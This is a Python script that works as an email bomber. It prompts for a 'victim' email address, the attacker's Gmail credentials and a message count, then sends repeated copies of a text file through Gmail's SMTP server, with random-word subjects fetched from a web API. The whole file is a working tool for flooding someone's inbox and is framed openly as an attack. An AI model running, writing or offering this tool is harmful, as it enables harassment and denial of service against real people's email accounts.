import smtplib, ssl
from email.mime.text import MIMEText
import requests
import os

current_path = os.getcwd()
data_folder = current_path + '\\Emailing\\TextFiles\\'

main_text = data_folder + 'MainText.txt'

subjects = ['Tell me about yourself.', 'Have you done anything exciting lately?', 'What made you smile today?', 'How did you meet the host?', 'Whats your favorite form of social media?']

receiver = str(input('Enter the victims email adress: '))
og = str(input('Enter the email adress you will be using to perform this attack: '))
pas = str(input('Attacker email app password (You can get it from the secure settings of your Google account): '))
count = int(input('How many emails would you like to send: '))
Text = open(main_text)
Text = str(Text.readlines())

def send_email(temperature):
    port = 465  # For SSL
    password = pas
    sender_email = og
    receiver_email = receiver
    message = MIMEText(Text)
    response = requests.get('https://random-word-api.herokuapp.com/word')
    message['Subject'] = response.text
    message['From'] = sender_email
    message['To'] = receiver_email

    server = smtplib.SMTP_SSL("smtp.gmail.com", port)
    server.login(sender_email, password)
    server.sendmail(sender_email, [receiver_email], message.as_string())
    server.quit()

try:
    for i in range(1, count):
        send_email(7.7)
        print(' An email has been sent. ')
except KeyboardInterrupt:
    print('[-] Canceled')
    exit()
except smtplib.SMTPAuthenticationError:
    print('[!] The key that you entered is incorrect')
    print('[!] OR')
    print('[!] The email you entered is invalid.')
